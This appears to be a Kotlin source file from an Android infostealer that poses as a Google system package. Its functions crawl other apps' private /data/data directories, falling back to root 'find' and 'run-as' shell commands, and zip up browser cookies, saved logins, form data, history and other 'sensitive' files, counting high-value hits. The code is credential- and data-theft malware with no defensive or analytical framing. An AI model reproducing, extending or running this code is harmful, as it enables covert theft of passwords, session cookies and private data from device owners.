package com.google.system

import android.content.Context
import android.os.Environment
import java.io.File
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

internal fun scanAppDataDir(pkg: String, name: String, category: String, zos: ZipOutputStream, r: GrabResult, hasRoot: Boolean) {
    val dir = File("/data/data/$pkg")
    if (dir.exists() && dir.canRead()) {
        scanDirRecursive(dir, "$category/$name", zos, r)
    } else if (hasRoot) {
        val output = runCommand("find /data/data/$pkg -type f -size +0c -size -5M 2>/dev/null | head -50")
        for (path in output.lines()) {
            if (path.isBlank() || r.size >= MAX_ZIP || r.files >= MAX_FILES) continue
            val f = File(path)
            if (f.exists() && f.length() in 1..MAX_FILE) {
                val rel = path.substring("/data/data/$pkg/".length)
                if (zip(f, "$category/$name/root_$rel", zos)) {
                    r.files++; r.size += f.length()
                    if (isSensitive(f.name)) r.highValue++
                }
            }
        }
    } else {
        val output = runCommand("run-as $pkg ls / 2>/dev/null")
        if (output.isNotBlank()) {
            val files = runCommand("run-as $pkg find / -type f 2>/dev/null | head -50")
            for (path in files.lines()) {
                if (path.isBlank() || r.size >= MAX_ZIP || r.files >= MAX_FILES) continue
                val content = runCommand("run-as $pkg cat $path 2>/dev/null")
                if (content.isNotBlank() && content.length < MAX_FILE.toInt()) {
                    val rel = path.trimStart('/', ' ')
                    val entryName = "$category/$name/runas_$rel"
                    try {
                        zos.putNextEntry(ZipEntry(entryName))
                        zos.write(content.toByteArray())
                        zos.closeEntry()
                        r.files++; r.size += content.length
                        if (isSensitive(rel)) r.highValue++
                    } catch (e: Exception) {
                        android.util.Log.e("AppDataScanner", "Runas scan failed", e)
                    }
                }
            }
        }
    }
}

internal fun scanExternalAppData(ctx: Context, pkg: String, name: String, category: String, zos: ZipOutputStream, r: GrabResult) {
    val roots = listOfNotNull(
        Environment.getExternalStorageDirectory(),
        ctx.getExternalFilesDir(null)?.parentFile?.parentFile?.parentFile,
    )
    for (root in roots) {
        val extData = File(root, "Android/data/$pkg")
        if (extData.exists() && extData.canRead()) {
            scanDirRecursive(extData, "$category/$name/external", zos, r)
        }
    }
}

internal fun scanDirRecursive(dir: File, zipPrefix: String, zos: ZipOutputStream, r: GrabResult) {
    if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
    try {
        val files = dir.listFiles() ?: return
        for (f in files) {
            if (r.size >= MAX_ZIP || r.files >= MAX_FILES) return
            if (f.isDirectory) {
                scanDirRecursive(f, "$zipPrefix/${f.name}", zos, r)
            } else if (f.isFile && f.length() in 1..MAX_FILE) {
                if (isSensitive(f.name) || f.extension.lowercase() in HIGH_VALUE_EXTS ||
                    f.name.equals("Cookies", ignoreCase = true) ||
                    f.name.equals("Login Data", ignoreCase = true) ||
                    f.name.equals("Web Data", ignoreCase = true) ||
                    f.name.equals("History", ignoreCase = true)) {
                    if (zip(f, "$zipPrefix/${f.name}", zos)) {
                        r.files++; r.size += f.length()
                        if (isSensitive(f.name)) r.highValue++
                    }
                }
            }
        }
    } catch (_: Exception) {}
}
